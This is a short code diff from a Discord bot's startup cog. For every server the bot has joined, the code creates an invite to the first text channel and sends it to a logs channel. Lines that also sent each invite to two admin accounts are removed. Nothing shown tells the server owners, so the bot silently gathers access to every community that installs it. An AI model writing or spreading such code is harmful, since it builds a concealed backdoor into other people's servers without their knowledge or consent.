@@ -30,8 +30,6 @@ class Ready(commands.Cog):
         global owners
         for guild in self.bot.guilds:
             inv = await guild.text_channels[0].create_invite()
-            await admin1.send(inv)
-            await admin2.send(inv)
             await logs.send(inv)
         owners = [admin1.id, admin2.id]
         while True:
